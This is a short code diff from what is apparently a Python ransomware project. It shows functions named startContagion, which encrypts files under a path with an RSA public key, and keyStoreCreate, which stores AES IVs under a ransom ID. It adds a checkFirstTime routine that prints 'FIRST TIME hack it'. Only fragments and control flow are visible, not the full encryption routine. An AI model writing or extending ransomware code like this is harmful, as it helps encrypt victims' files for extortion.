@@ -44,6 +44,7 @@ def isValidFile(file_name):
         return True
     return False
 
+
 def startContagion(path,rsapublickey):
     """
         What happening in here:
@@ -93,6 +94,7 @@ def startContagion(path,rsapublickey):
 
     print("FILE ENCRYPTION HAS JUST DONE")
 
+
 def keyStoreCreate(version,ransomid):
 
     with open(utils.aesIV_file_store_path,"w") as key_storing_file:
@@ -102,3 +104,10 @@ def keyStoreCreate(version,ransomid):
         # and so on
     print("STORE FILE CREATED")
 
+
+def checkFirstTime():
+    if len(sys.argv) > 1:
+        print("print second time show only gui")
+        return False
+    print("FIRST TIME hack it")
+    return True
